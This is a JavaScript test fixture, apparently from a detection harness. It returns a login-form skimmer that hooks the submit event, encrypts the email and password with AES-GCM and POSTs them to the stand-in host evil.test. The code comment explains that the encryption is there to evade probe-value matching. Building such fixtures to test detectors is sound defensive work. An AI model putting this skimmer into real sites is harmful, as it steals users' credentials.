// A skimmer that encrypts the credentials (AES-GCM) before sending them, so no probe value appears
// in the request; only the growth test can catch it.
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `document.getElementById('login').addEventListener('submit', async function (e) {
  e.preventDefault();
  var text = document.getElementById('email').value + '|' + document.getElementById('password').value;
  var key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 128 }, true, ['encrypt']);
  var iv = crypto.getRandomValues(new Uint8Array(12));
  var ct = new Uint8Array(await crypto.subtle.encrypt({ name: 'AES-GCM', iv: iv }, key, new TextEncoder().encode(text)));
  var b64 = btoa(String.fromCharCode.apply(null, ct));
  fetch('${ctx.origin('evil.test')}/e', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ d: b64, v: 1 }) });
});`);
